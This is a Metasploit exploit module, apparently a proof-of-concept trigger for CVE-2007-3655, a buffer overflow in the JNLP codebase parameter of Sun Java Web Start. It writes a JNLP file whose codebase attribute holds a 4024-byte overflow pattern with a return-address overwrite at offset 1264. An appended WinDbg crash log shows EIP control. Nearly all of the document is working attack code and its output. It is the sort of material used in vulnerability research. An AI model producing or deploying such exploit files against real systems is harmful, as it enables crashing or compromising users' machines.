require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Java Web Start JNLP codebase parameter PoC',
			'Description'    => %q{
					This is simply a trigger for the Sun Java Web Start JNLP
				codebase parameter buffer overflow.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'CVE', '2007-3655' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'          => 750,
					'BadChars'       => "",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'javaws 6.0.10.6', { 'Ret' => 0x41414141 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 5 2007',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.jnlp' ]),
			], self.class)
	end

	def exploit

		sploit = pattern_create(4024)
		sploit[1264, 4] = [target.ret].pack('V')

		jnlp = %Q|<?xml version="1.0" encoding="utf-8"?>
<!-- JNLP File for SwingSet2 Demo Application -->
<jnlp
spec="1.0+"
codebase="#{sploit}"
href="swingset2.jnlp">
<information>
<title>SwingSet2 Demo Application</title>
<vendor>Oracle and/or its affiliates.</vendor>
<homepage href="docs/help.html"/>
<description>SwingSet2 Demo Application</description>
<description kind="short">A demo of the capabilities of the Swing Graphical User Interface.</description>
<icon href="images/swingset2.jpg"/>
<icon kind="splash" href="images/splash.gif"/>
<offline-allowed/>
</information>
<security>
<all-permissions/>
</security>
<resources>
<j2se version="1.4.2" initial-heap-size="64m" max-heap-size="128m"/>
<jar href="lib/SwingSet2.jar"/>
</resources>
<application-desc main-class="SwingSet2"/>
</jnlp>
		|

		file_create(jnlp)

	end
end
__END__
(43c.89c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00003862 edx=0012e9dc esi=0041632c edi=00889bb8
eip=71423171 esp=0012f1bc ebp=42307142 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
71423171 ??              ???
0:000> dd esp
0012f1bc  33714232 42347142 71423571 37714236
0012f1cc  42387142 72423971 31724230 42327242
0012f1dc  72423372 35724234 42367242 72423772
0012f1ec  39724238 42307342 73423173 33734232
0012f1fc  42347342 73423573 37734236 42387342
0012f20c  74423973 31744230 42327442 74423374
0012f21c  35744234 42367442 74423774 39744238
0012f22c  42307542 75423175 33754232 42347542
